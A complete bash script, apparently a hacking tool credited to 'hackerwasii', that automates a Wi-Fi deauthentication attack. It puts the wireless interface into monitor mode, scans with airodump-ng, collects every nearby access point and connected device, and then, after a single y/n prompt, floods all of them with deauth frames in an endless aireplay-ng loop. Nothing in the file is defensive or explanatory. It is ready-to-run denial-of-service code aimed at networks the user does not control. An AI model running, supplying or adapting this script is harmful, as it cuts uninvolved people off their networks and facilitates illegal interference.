#!/bin/bash

# ██████╗ ███████╗ █████╗ ██╗   ██╗███████╗██████╗ 
# ██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
# ██████╔╝█████╗  ███████║██║   ██║███████╗██████╔╝
# ██╔═══╝ ██╔══╝  ██╔══██║██║   ██║╚════██║██╔═══╝ 
# ██║     ███████╗██║  ██║╚██████╔╝███████║██║     
# ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝     
#   - Auto Wi-Fi Deauth Attack Script -
#   - Author: Waseem Akram(hackerwasii)

# Colors
RED="\e[31m"
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

# Banner
clear
echo -e "${RED}"
echo " ██████╗ ███████╗ █████╗ ██╗   ██╗███████╗██████╗  "
echo " ██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗ "
echo " ██████╔╝█████╗  ███████║██║   ██║███████╗██████╔╝ "
echo " ██╔═══╝ ██╔══╝  ██╔══██║██║   ██║╚════██║██╔═══╝  "
echo " ██║     ███████╗██║  ██║╚██████╔╝███████║██║      "
echo " ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝      "
echo -e "     ${YELLOW}- Auto Wi-Fi Deauth Attack Script -${RESET}"
echo -e "    ${YELLOW}- Author: Waseem Akram(hackerwasii) -${RESET}"
echo ""

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[✘] Please run this script as root!${RESET}"
    exit 1
fi

# Kill interfering processes
echo -e "${YELLOW}[!] Killing conflicting processes...${RESET}"
airmon-ng check kill >/dev/null 2>&1
systemctl stop NetworkManager >/dev/null 2>&1
systemctl stop wpa_supplicant >/dev/null 2>&1
echo -e "${GREEN}[✓] All conflicting processes stopped.${RESET}"

# Detect wireless interface
IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
if [[ -z "$IFACE" ]]; then
    echo -e "${RED}[✘] No Wi-Fi interface found!${RESET}"
    exit 1
fi
echo -e "${CYAN}[✓] Wireless interface detected: ${GREEN}$IFACE${RESET}"

# Enable monitor mode
echo -e "${YELLOW}[!] Enabling monitor mode...${RESET}"
ifconfig "$IFACE" down
iwconfig "$IFACE" mode monitor
ifconfig "$IFACE" up
echo -e "${GREEN}[✓] Monitor mode enabled on $IFACE${RESET}"

# Scan for Wi-Fi networks
echo -e "${CYAN}[!] Scanning for Wi-Fi networks (Press Ctrl+C to stop)...${RESET}"
rm -f scan_results-01.csv
x-terminal-emulator -e "airodump-ng --output-format csv -w scan_results $IFACE" &

# Wait for scan results
sleep 10

# Extract AP BSSIDs
echo -e "${GREEN}[✓] Networks found:${RESET}"
awk -F',' 'NR>2 && length($1)>0 {print $1 " - " $14}' scan_results-01.csv > targets.txt
cat targets.txt

# Extract station MACs
echo -e "${CYAN}[!] Scanning for connected devices...${RESET}"
awk -F',' 'NR>2 && $6!="" {print $1}' scan_results-01.csv > stations.txt

echo -e "${GREEN}[✓] Connected devices:${RESET}"
cat stations.txt

# Confirm attack
echo -e "${YELLOW}[?] Do you want to attack all networks and devices? (y/n)${RESET}"
read -r choice

if [[ $choice != "y" ]]; then
    echo -e "${RED}[✘] Attack aborted.${RESET}"
    exit 1
fi

echo -e "${RED}[!] Attacking all networks and devices!${RESET}"

# Start Deauthentication Attack
while true; do
    # Get APs
    while IFS= read -r bssid; do
        # Switch to the correct channel
        CHAN=$(awk -F',' -v mac="$bssid" '$1==mac {print $4}' scan_results-01.csv | head -n1)
        echo -e "${CYAN}[!] Switching to channel $CHAN for $bssid${RESET}"
        iwconfig "$IFACE" channel "$CHAN"

        # Attack AP
        aireplay-ng --deauth 0 -a "$bssid" "$IFACE" &
    done < targets.txt

    # Get Clients
    while IFS= read -r station; do
        # Attack Client
        aireplay-ng --deauth 0 -c "$station" "$IFACE" &
    done < stations.txt

    sleep 10
done
